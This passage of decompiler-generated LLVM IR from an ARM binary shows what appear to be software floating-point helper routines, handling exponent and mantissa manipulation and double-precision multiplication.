  br i1 %tmp45, label %dec_label_pc_17d74, label %dec_label_pc_17d88

dec_label_pc_17d74:                               ; preds = %.thread8
  %v0_17d74 = load i32, i32* %r0.global-to-local, align 4
  %v1_17d74 = icmp slt i32 %v0_17d74, 0
  %v2_17d74 = mul i32 %v0_17d74, 2
  store i32 %v2_17d74, i32* %r0.global-to-local, align 4
  %v0_17d78 = load i32, i32* @r1, align 4
  %v3_17d78 = mul i32 %v0_17d78, 2
  %v4_17d78 = zext i1 %v1_17d74 to i32
  %v5_17d78 = or i32 %v3_17d78, %v4_17d78
  %v9_17d78 = icmp ule i32 %v5_17d78, %v0_17d78
  %v10_17d78 = icmp ult i32 %v3_17d78, %v0_17d78
  %v11_17d78 = select i1 %v1_17d74, i1 %v9_17d78, i1 %v10_17d78
  br i1 %v11_17d78, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_17d74
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_17d74, %bb34
  ret i32 %v2_17d74

dec_label_pc_17d88:                               ; preds = %.thread8
  %v2_17d88 = icmp ugt i32 %v0_17d6c, -4194305
  br i1 %v2_17d88, label %dec_label_pc_17d88..thread9_crit_edge, label %bb36

dec_label_pc_17d88..thread9_crit_edge:            ; preds = %dec_label_pc_17d88
  %v0_17d94.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_17d88
  %v1_17d8c = load i32, i32* @r1, align 4
  %v2_17d8c = add i32 %v1_17d8c, 1048576
  store i32 %v2_17d8c, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17d88..thread9_crit_edge, %bb36
  %v0_17d94 = phi i32 [ %v0_17d94.pre, %dec_label_pc_17d88..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_17d94 = xor i1 %v2_17d88, true
  call void @__pseudo_cond_branch(i1 %v2_17d94, i32 %v0_17d94)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_17dc8.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_17dc8.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_17db4 = load i32, i32* @r3, align 4
  %v1_17db8 = load i32, i32* @r2, align 4
  store i32 %v1_17db8, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_17dc823 = phi i32 [ %v1_17dc8.pre, %.thread14 ], [ %v1_17db4, %bb37 ]
  %v1_17dc4 = phi i32 [ %v0_17d28, %.thread14 ], [ %v1_17db8, %bb37 ]
  store i32 %v1_17dc4, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_17dd4 = phi i32 [ %v1_17dc823, %bb38 ], [ %v1_17dc8.pre, %.thread11 ]
  %v1_17ddc = phi i32 [ %v1_17dc4, %bb38 ], [ %v0_17d28, %.thread11 ]
  %v4_17dc8 = mul i32 %v1_17dd4, 4096
  %v5_17dc8 = or i32 %v4_17dc8, %v1_17ddc
  %v7_17dc8 = icmp eq i32 %v5_17dc8, 0
  br i1 %v7_17dc8, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_17dcc = load i32, i32* @r2, align 4
  %v2_17dcc = load i32, i32* @r3, align 4
  %v5_17dcc = mul i32 %v2_17dcc, 4096
  %v6_17dcc = or i32 %v5_17dcc, %v1_17dcc
  %v8_17dcc = icmp eq i32 %v6_17dcc, 0
  br i1 %v8_17dcc, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_17dd0 = icmp eq i32 %v2_17dcc, %v1_17dd4
  br i1 %v5_17dd0, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_17ddc

; uselistorder directives
  uselistorder i32 %v1_17dc8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_17d78, { 1, 2, 0 }
  uselistorder i32 %v2_17d74, { 1, 0 }
  uselistorder i1 %v1_17d74, { 1, 0 }
  uselistorder i32 %v0_17d6c, { 1, 0 }
  uselistorder i1 %v4_17d58, { 1, 0 }
  uselistorder i32 %v0_17d2c, { 2, 0, 1 }
  uselistorder i32 %v0_17d28, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_17d44, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_17de0() local_unnamed_addr {
dec_label_pc_17de0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_17de0 = load i32, i32* @r0, align 4
  %v2_17de0 = icmp eq i32 %v0_17de0, 0
  br i1 %v2_17de0, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_17de0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17de0, %bb
  %v0_17de8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17de0, i32 %v0_17de8)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_17e00 = call i32 @function_17c20()
  store i32 %v0_17e00, i32* @r0, align 4
  %v2_17e04 = icmp eq i32 %v0_17e00, 0
  br i1 %v2_17e04, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_17e0c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17e04, i32 %v0_17e0c)
  store i32 1074, i32* @r4, align 4
  %v1_17e1c = and i32 %v0_17e00, -2147483648
  store i32 %v1_17e1c, i32* @r5, align 4
  %v2_17e1c = icmp eq i32 %v1_17e1c, 0
  br i1 %v2_17e1c, label %bb22, label %bb21

bb21:                                             ; preds = %bb20
  %v2_17e20 = sub i32 0, %v0_17e00
  store i32 %v2_17e20, i32* @r0, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  store i32 0, i32* @r1, align 4
  %v0_17e28 = call i32 @function_17c20()
  %v2_17e2c = mul i32 %v0_17e28, 2
  store i32 %v2_17e2c, i32* %r2.global-to-local, align 4
  %v4_17e2c = icmp eq i32 %v2_17e2c, 0
  %v1_17e30 = and i32 %v2_17e2c, 4
  %v2_17e30 = icmp ne i32 %v1_17e30, 0
  %v3_17e30 = sdiv i32 %v2_17e2c, 8
  %v3_17e34 = zext i1 %v2_17e30 to i32
  %v6_17e34 = zext i32 %v3_17e30 to i64
  %v7_17e34 = sub nsw i32 33, %v3_17e30
  %v8_17e34 = zext i32 %v7_17e34 to i64
  %v9_17e34 = shl i64 %v6_17e34, %v8_17e34
  %v10_17e34 = sub nsw i32 32, %v3_17e30
  %v11_17e34 = shl i32 %v3_17e34, %v10_17e34
  %v12_17e34 = zext i32 %v11_17e34 to i64
  %v14_17e34 = or i64 %v12_17e34, %v9_17e34
  %v15_17e34 = trunc i64 %v14_17e34 to i32
  store i32 %v15_17e34, i32* %r1.global-to-local, align 4
  %v3_17e38 = mul i32 %v0_17e28, 536870912
  store i32 %v3_17e38, i32* @r0, align 4
  br i1 %v4_17e2c, label %.thread1, label %bb23

bb23:                                             ; preds = %bb22
  %v2_17e3c = and i32 %v2_17e2c, -16777216
  store i32 %v2_17e3c, i32* @r3, align 4
  %v4_17e3c = icmp eq i32 %v2_17e3c, 0
  br i1 %v4_17e3c, label %.thread1, label %bb24

bb24:                                             ; preds = %bb23
  %v4_17e40 = icmp ugt i32 %v2_17e2c, -16777217
  br i1 %v4_17e40, label %.thread1, label %bb25

bb25:                                             ; preds = %bb24
  %v2_17e44 = xor i32 %v15_17e34, 939524096
  store i32 %v2_17e44, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb22, %bb23, %bb24, %bb25
  %v1_17e48 = phi i1 [ false, %bb23 ], [ false, %bb24 ], [ true, %bb25 ], [ false, %bb22 ]
  %v0_17e48 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17e48, i32 %v0_17e48)
  %v0_17e4c = load i32, i32* %r2.global-to-local, align 4
  %v2_17e4c = icmp eq i32 %v0_17e4c, 0
  br i1 %v2_17e4c, label %dec_label_pc_17e9c, label %bb26

bb26:                                             ; preds = %.thread1
  %v1_17e50 = load i32, i32* @r3, align 4
  %v4_17e50 = icmp eq i32 %v1_17e50, -16777216
  br label %dec_label_pc_17e9c

dec_label_pc_17e9c:                               ; preds = %.thread1, %bb26
  %v1_17e54 = phi i1 [ true, %.thread1 ], [ %v4_17e50, %bb26 ]
  %v0_17e54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17e54, i32 %v0_17e54)
  store i32 896, i32* @r4, align 4
  %v0_17e60 = load i32, i32* %r1.global-to-local, align 4
  %v1_17e60 = and i32 %v0_17e60, -2147483648
  store i32 %v1_17e60, i32* @r5, align 4
  %tmp = bitcast i32 %v0_17e60 to float
  %tmp32 = call float @fabsf(float %tmp)
  %v1_17e64 = bitcast float %tmp32 to i32
  store i32 %v1_17e64, i32* @r1, align 4
  %v0_17e68 = call i32 @function_17c20()
  %v1_17e6c = load i32, i32* @r1, align 4
  %v2_17e6c = or i32 %v1_17e6c, %v0_17e68
  store i32 %v2_17e6c, i32* %r2.global-to-local, align 4
  %v4_17e6c = icmp eq i32 %v2_17e6c, 0
  %v0_17e70 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_17e6c, i32 %v0_17e70)
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_17ea4 = load i32, i32* @r1, align 4
  %tmp33 = icmp ult i32 %v0_17ea4, 4194304
  call void @__pseudo_cond_branch(i1 %tmp33, i32 ptrtoint (i32* @global_var_17bc0.713 to i32))
  %tmp34 = icmp ult i32 %v0_17ea4, 33554432
  br i1 %tmp34, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_17e9c
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_17e9c, %bb27
  %v1_17ebc = phi i32 [ 6, %bb27 ], [ 3, %dec_label_pc_17e9c ]
  %tmp35 = icmp ult i32 %v0_17ea4, 268435456
  br i1 %tmp35, label %bb30, label %bb29

bb29:                                             ; preds = %bb28
  %v2_17ebc = add nuw nsw i32 %v1_17ebc, 3
  br label %bb30

bb30:                                             ; preds = %bb28, %bb29
  %v0_17ec0 = phi i32 [ %v2_17ebc, %bb29 ], [ %v1_17ebc, %bb28 ]
  %not. = icmp slt i32 %v0_17ea4, 0
  %v4_17ec0 = zext i1 %not. to i32
  %v5_17ec0 = add nsw i32 %v0_17ec0, %v4_17ec0
  store i32 %v5_17ec0, i32* %r2.global-to-local, align 4
  %v1_17ec4 = sub nsw i32 32, %v5_17ec0
  %v6_17ec8 = shl i32 %v0_17e68, %v1_17ec4
  store i32 %v6_17ec8, i32* @ip, align 4
  %v6_17ecc = lshr i32 %v0_17e68, %v5_17ec0
  %v1_17ed0 = load i32, i32* @r1, align 4
  %v7_17ed0 = shl i32 %v1_17ed0, %v1_17ec4
  %v8_17ed0 = or i32 %v7_17ed0, %v6_17ecc
  %v6_17ed4 = lshr i32 %v1_17ed0, %v5_17ec0
  store i32 %v6_17ed4, i32* %r1.global-to-local, align 4
  %v0_17ed8 = load i32, i32* %r4.global-to-local, align 4
  %v2_17ed8 = add i32 %v0_17ed8, %v5_17ec0
  store i32 %v2_17ed8, i32* @r4, align 4
  %v4_17edc = sext i32 %v8_17ed0 to i64
  %v5_17edc = call i32 @function_17bc0(i64 %v4_17edc, i32 %v6_17ed4, i32 %v5_17ec0, i32 %v1_17ec4)
  ret i32 %v5_17edc

; uselistorder directives
  uselistorder i32 %v5_17ec0, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_17e68, { 1, 2, 0 }
  uselistorder i32 %v3_17e30, { 1, 2, 0 }
  uselistorder i32 %v2_17e2c, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 3, { 42, 0, 39, 48, 49, 50, 51, 10, 52, 20, 53, 56, 1, 17, 54, 11, 12, 2, 3, 45, 57, 4, 5, 31, 32, 67, 33, 34, 35, 36, 37, 38, 58, 8, 23, 60, 24, 25, 43, 9, 44, 68, 18, 62, 22, 63, 21, 64, 55, 13, 14, 15, 7, 16, 61, 6, 65, 59, 40, 66, 41, 26, 46, 27, 19, 28, 29, 30, 47 }
  uselistorder i32 6, { 0, 13, 14, 4, 9, 10, 15, 16, 17, 18, 5, 6, 20, 3, 1, 7, 19, 2, 8, 11, 12 }
  uselistorder i32 ()* @function_17c20, { 2, 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_17e9c, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_17ee0(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17ee0:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17ee0 = load i32, i32* @r4, align 4
  store i32 %v3_17ee0, i32* %stack_var_-16, align 4
  %v6_17ee0 = load i32, i32* @r5, align 4
  %v9_17ee0 = load i32, i32* @r6, align 4
  %v12_17ee0 = load i32, i32* @lr, align 4
  store i32 2047, i32* @ip, align 4
  %v4_17eec = udiv i32 %arg2, 1048576
  %v5_17eec = urem i32 %v4_17eec, 2048
  store i32 %v5_17eec, i32* %r4.global-to-local, align 4
  %v6_17eec = icmp eq i32 %v5_17eec, 0
  br i1 %v6_17eec, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_17ee0
  %v5_17ef0 = udiv i32 %arg4, 1048576
  %v6_17ef0 = urem i32 %v5_17ef0, 2048
  store i32 %v6_17ef0, i32* @r5, align 4
  %v7_17ef0 = icmp eq i32 %v6_17ef0, 0
  br i1 %v7_17ef0, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_17ef4 = icmp eq i32 %v5_17eec, 2047
  br i1 %v5_17ef4, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_17ef8 = icmp eq i32 %v6_17ef0, 2047
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17ee0, %bb, %bb38, %bb39
  %v0_17efc = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_17ef8, %bb39 ], [ true, %dec_label_pc_17ee0 ]
  store i32 ptrtoint (i32* @global_var_17f00.717 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_17efc, i32 ptrtoint (i32* @global_var_180d8.715 to i32))
  %v0_17f00 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f00 = load i32, i32* @r5, align 4
  %v2_17f00 = add i32 %v1_17f00, %v0_17f00
  store i32 %v2_17f00, i32* %r4.global-to-local, align 4
  %v2_17f04 = xor i32 %arg4, %arg2
  %v1_17f08 = load i32, i32* @ip, align 4
  %tmp51 = mul i32 %v1_17f08, -2097152
  %v5_17f08 = add i32 %tmp51, -1
  %v6_17f08 = and i32 %v5_17f08, %arg2
  store i32 %v6_17f08, i32* %r1.global-to-local, align 4
  %v6_17f0c = and i32 %v5_17f08, %arg4
  %v5_17f10 = mul i32 %arg2, 4096
  %v6_17f10 = or i32 %v5_17f10, %tmp32
  store i32 %v6_17f10, i32* @r5, align 4
  %v8_17f10 = icmp eq i32 %v6_17f10, 0
  br i1 %v8_17f10, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_17f185 = or i32 %v6_17f08, 1048576
  store i32 %v1_17f185, i32* %r1.global-to-local, align 4
  %v1_17f1c7 = or i32 %v6_17f0c, 1048576
  br label %dec_label_pc_17f9c

bb40:                                             ; preds = %.thread2
  %v6_17f14 = mul i32 %arg4, 4096
  %v7_17f14 = or i32 %v6_17f14, %arg3
  store i32 %v7_17f14, i32* @r5, align 4
  %v9_17f14 = icmp eq i32 %v7_17f14, 0
  %v1_17f18 = or i32 %v6_17f08, 1048576
  store i32 %v1_17f18, i32* %r1.global-to-local, align 4
  %v1_17f1c = or i32 %v6_17f0c, 1048576
  br i1 %v9_17f14, label %dec_label_pc_17f9c, label %dec_label_pc_17f24

dec_label_pc_17f24:                               ; preds = %bb40
  %v6_17f24 = mul nuw i64 %tmp, %arg1
  %v7_17f24 = udiv i64 %v6_17f24, 4294967296
  %v9_17f24 = trunc i64 %v6_17f24 to i32
  %v7_17f2c = zext i32 %v1_17f18 to i64
  %v11_17f2c = mul nuw nsw i64 %v7_17f2c, %tmp
  %v12_17f2c = add i64 %v11_17f2c, %v7_17f24
  %v1_17f30 = and i32 %v2_17f04, -2147483648
  %v10_17f34 = zext i32 %v1_17f1c to i64
  %v11_17f34 = mul nuw i64 %v10_17f34, %arg1
  %v12_17f34 = add i64 %v12_17f2c, %v11_17f34
  %v13_17f34 = udiv i64 %v12_17f34, 4294967296
  %v15_17f34 = trunc i64 %v12_17f34 to i32
  %v10_17f3c = mul nuw i64 %v10_17f34, %v7_17f2c
  %v11_17f3c = add i64 %v13_17f34, %v10_17f3c
  %v12_17f3c = udiv i64 %v11_17f3c, 4294967296
  %v13_17f3c = trunc i64 %v12_17f3c to i32
  %v14_17f3c = trunc i64 %v11_17f3c to i32
  %v2_17f40 = icmp eq i32 %v9_17f24, 0
  br i1 %v2_17f40, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_17f24
  %v2_17f44 = or i32 %v15_17f34, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_17f24, %bb41
  %storemerge = phi i32 [ %v2_17f44, %bb41 ], [ %v15_17f34, %dec_label_pc_17f24 ]
  %v0_17f58 = phi i32 [ %v2_17f44, %bb41 ], [ %v15_17f34, %dec_label_pc_17f24 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_17f48 = add i32 %v2_17f00, -255
  %v2_17f4c = icmp ugt i32 %v13_17f3c, 511
  %v2_17f50 = icmp eq i1 %v2_17f4c, false
  %v3_17f50 = add i32 %v2_17f00, -1023
  %v5_17f50 = sext i1 %v2_17f50 to i32
  %v6_17f50 = add i32 %v3_17f50, %v5_17f50
  store i32 %v6_17f50, i32* %r4.global-to-local, align 4
  %v3_17f54 = icmp ugt i32 %v1_17f48, 768
  br i1 %v3_17f54, label %dec_label_pc_17f64, label %dec_label_pc_17f58

dec_label_pc_17f58:                               ; preds = %bb42
  %v1_17f58 = icmp slt i32 %v0_17f58, 0
  %v2_17f58 = mul i32 %v0_17f58, 2
  store i32 %v2_17f58, i32* %lr.global-to-local, align 4
  %v3_17f5c = mul i32 %v14_17f3c, 2
  %v4_17f5c = zext i1 %v1_17f58 to i32
  %v5_17f5c = or i32 %v4_17f5c, %v3_17f5c
  %v9_17f5c = icmp ule i32 %v5_17f5c, %v14_17f3c
  %v10_17f5c = icmp ult i32 %v3_17f5c, %v14_17f3c
  %v11_17f5c = select i1 %v1_17f58, i1 %v9_17f5c, i1 %v10_17f5c
  %v3_17f6025 = mul nuw nsw i64 %v12_17f3c, 2
  %v3_17f60 = trunc i64 %v3_17f6025 to i32
  %v4_17f60 = zext i1 %v11_17f5c to i32
  %v5_17f60 = or i32 %v4_17f60, %v3_17f60
  br label %dec_label_pc_17f64

dec_label_pc_17f64:                               ; preds = %bb42, %dec_label_pc_17f58
  %v0_17f74 = phi i32 [ %v0_17f58, %bb42 ], [ %v2_17f58, %dec_label_pc_17f58 ]
  %v0_17f6c = phi i32 [ %v14_17f3c, %bb42 ], [ %v5_17f5c, %dec_label_pc_17f58 ]
  %v1_17f64 = phi i32 [ %v13_17f3c, %bb42 ], [ %v5_17f60, %dec_label_pc_17f58 ]
  %v4_17f64 = mul i32 %v1_17f64, 2048
  %v4_17f68 = udiv i32 %v0_17f6c, 2097152
  %v5_17f64 = or i32 %v4_17f68, %v1_17f30
  %v5_17f68 = or i32 %v5_17f64, %v4_17f64
  store i32 %v5_17f68, i32* %r1.global-to-local, align 4
  %v3_17f6c = mul i32 %v0_17f6c, 2048
  %v4_17f70 = udiv i32 %v0_17f74, 2097152
  %v5_17f70 = or i32 %v3_17f6c, %v4_17f70
  store i32 %v5_17f70, i32* %r0.global-to-local, align 4
  %v3_17f74 = mul i32 %v0_17f74, 2048
  store i32 %v3_17f74, i32* %lr.global-to-local, align 4
  %v1_17f78 = add i32 %v6_17f50, -253
  store i32 %v1_17f78, i32* @ip, align 4
  %v2_17f78 = icmp ugt i32 %v6_17f50, 252
  %v7_17f78 = icmp eq i32 %v6_17f50, 253
  %v2_17f7c = xor i1 %v7_17f78, true
  %v3_17f7c = and i1 %v2_17f78, %v2_17f7c
  br i1 %v3_17f7c, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_17f64
  %v6_17f7c = icmp ugt i32 %v1_17f78, 1791
  %v11_17f7c = icmp eq i32 %v1_17f78, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_17f64, %bb43
  %v1_17f80 = phi i1 [ %v7_17f78, %dec_label_pc_17f64 ], [ %v11_17f7c, %bb43 ]
  %v0_17f80 = phi i1 [ %v2_17f78, %dec_label_pc_17f64 ], [ %v6_17f7c, %bb43 ]
  %v2_17f80 = xor i1 %v1_17f80, true
  %v3_17f80 = and i1 %v0_17f80, %v2_17f80
  call void @__pseudo_cond_branch(i1 %v3_17f80, i32 ptrtoint (i32* @global_var_17fcc.716 to i32))
  %v0_17f84 = load i32, i32* %lr.global-to-local, align 4
  %v2_17f84 = icmp slt i32 %v0_17f84, 0
  %v6_17f84 = icmp eq i32 %v0_17f84, -2147483648
  %v1_17f88 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17f84, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_17f88 = urem i32 %v1_17f88, 2
  %v3_17f88 = icmp ne i32 %v2_17f88, 0
  %v4_17f88 = udiv i32 %v1_17f88, 2
  store i32 %v4_17f88, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_17f8c = phi i1 [ %v3_17f88, %bb45 ], [ %v2_17f84, %bb44 ]
  %v2_17f8c = zext i1 %v1_17f8c to i32
  %v3_17f8c = add i32 %v2_17f8c, %v1_17f88
  store i32 %v3_17f8c, i32* %r0.global-to-local, align 4
  %v0_17f90 = load i32, i32* %r1.global-to-local, align 4
  %v1_17f90 = load i32, i32* %r4.global-to-local, align 4
  %v2_17f90 = and i32 %v1_17f90, 4096
  %v3_17f90 = icmp ne i32 %v2_17f90, 0
  %v4_17f90 = mul i32 %v1_17f90, 1048576
  %v6_17f90 = add i32 %v4_17f90, %v0_17f90
  %v7_17f90 = zext i1 %v3_17f90 to i32
  %v8_17f90 = add i32 %v7_17f90, %v6_17f90
  store i32 %v8_17f90, i32* %r1.global-to-local, align 4
  %v2_17f94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17f94, i32* @r4, align 4
  store i32 %v6_17ee0, i32* @r5, align 4
  store i32 %v9_17ee0, i32* @r6, align 4
  store i32 %v12_17ee0, i32* @lr, align 4
  ret i32 %v3_17f8c

dec_label_pc_17f9c:                               ; preds = %.thread3, %bb40
  %v1_17fa8 = phi i32 [ %v1_17f1c7, %.thread3 ], [ %v1_17f1c, %bb40 ]
  %v1_17fa0 = phi i32 [ %v1_17f185, %.thread3 ], [ %v1_17f18, %bb40 ]
  %v1_17f9c = and i32 %v2_17f04, -2147483648
  store i32 %v1_17f9c, i32* @r6, align 4
  %v2_17fa0 = or i32 %v1_17fa0, %v1_17f9c
  %v4_17fa41 = or i64 %tmp, %arg1
  %v4_17fa4 = trunc i64 %v4_17fa41 to i32
  store i32 %v4_17fa4, i32* %r0.global-to-local, align 4
  %v2_17fa8 = xor i32 %v2_17fa0, %v1_17fa8
  store i32 %v2_17fa8, i32* %r1.global-to-local, align 4
  %v4_17fac = udiv i32 %v1_17f08, 2
  %v5_17fac = sub i32 %v2_17f00, %v4_17fac
  store i32 %v5_17fac, i32* %r4.global-to-local, align 4
  %v7_17fac = sub i32 0, %v5_17fac
  %v8_17fac = and i32 %v2_17f00, %v7_17fac
  %v11_17fac = icmp eq i32 %v2_17f00, %v4_17fac
  %v7_17fb0 = icmp sgt i32 %v2_17f00, %v4_17fac
  br i1 %v7_17fb0, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_17f9c
  %v10_17fb0 = sub i32 %v1_17f08, %v5_17fac
  store i32 %v10_17fb0, i32* @r5, align 4
  %v12_17fb0 = xor i32 %v5_17fac, %v1_17f08
  %v13_17fb0 = xor i32 %v10_17fb0, %v1_17f08
  %v14_17fb0 = and i32 %v13_17fb0, %v12_17fb0
  %v17_17fb0 = icmp eq i32 %v1_17f08, %v5_17fac
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_17f9c, %bb46
  %v3_17fbc.in = phi i32 [ %v8_17fac, %dec_label_pc_17f9c ], [ %v14_17fb0, %bb46 ]
  %v2_17fbc.in = phi i32 [ %v5_17fac, %dec_label_pc_17f9c ], [ %v10_17fb0, %bb46 ]
  %v1_17fbc = phi i1 [ %v11_17fac, %dec_label_pc_17f9c ], [ %v17_17fb0, %bb46 ]
  %v2_17fbc = icmp slt i32 %v2_17fbc.in, 0
  %v3_17fbc = icmp slt i32 %v3_17fbc.in, 0
  %v3_17fb4 = xor i1 %v3_17fbc, %v2_17fbc
  %v4_17fb4 = or i1 %v1_17fbc, %v3_17fb4
  br i1 %v4_17fb4, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_17fbc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_17fb430 = mul i32 %v5_17fac, 1048576
  %v10_17fb431 = or i32 %v2_17fa8, %v9_17fb430
  store i32 %v10_17fb431, i32* %r1.global-to-local, align 4
  %v7_17fb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_17fb8, i32* %r4.global-to-local, align 4
  store i32 %v6_17ee0, i32* @r5, align 4
  store i32 %v9_17ee0, i32* @r6, align 4
  store i32 %v12_17ee0, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_17fbc = phi i32 [ %v0_17fbc.pre, %._crit_edge23 ], [ %v12_17ee0, %bb48 ]
  %v6_17fbc = xor i1 %v4_17fb4, true
  call void @__pseudo_cond_branch(i1 %v6_17fbc, i32 %v0_17fbc)
  %v0_17fc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17fc0 = or i32 %v0_17fc0, 1048576
  store i32 %v1_17fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_17fc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_17fc8 = add i32 %v0_17fc8, -1
  store i32 %v1_17fc8, i32* @r4, align 4
  ret i32 %v4_17fa4

; uselistorder directives
  uselistorder i32 %v5_17fac, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_17fac, { 2, 1, 0 }
  uselistorder i32 %v1_17f88, { 2, 0, 1 }
  uselistorder i32 %v0_17f84, { 1, 0 }
  uselistorder i1 %v7_17f78, { 1, 0 }
  uselistorder i32 %v2_17f58, { 1, 0 }
  uselistorder i1 %v1_17f58, { 1, 0 }
  uselistorder i32 %v6_17f50, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17f58, { 1, 0, 2 }
  uselistorder i32 %v14_17f3c, { 1, 3, 2, 0 }
  uselistorder i64 %v11_17f3c, { 1, 0 }
  uselistorder i64 %v12_17f34, { 1, 0 }
  uselistorder i64 %v10_17f34, { 1, 0 }
  uselistorder i64 %v7_17f2c, { 1, 0 }
  uselistorder i64 %v6_17f24, { 1, 0 }
  uselistorder i32 %v6_17f0c, { 1, 0 }
  uselistorder i32 %v6_17f08, { 1, 0, 2 }
  uselistorder i32 %v1_17f08, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_17f00, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_17ef0, { 2, 1, 0 }
  uselistorder i32 %v5_17eec, { 2, 1, 0 }
  uselistorder i32 %v12_17ee0, { 0, 2, 1 }
  uselistorder i32 %v9_17ee0, { 1, 0 }
  uselistorder i32 %v6_17ee0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 10, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
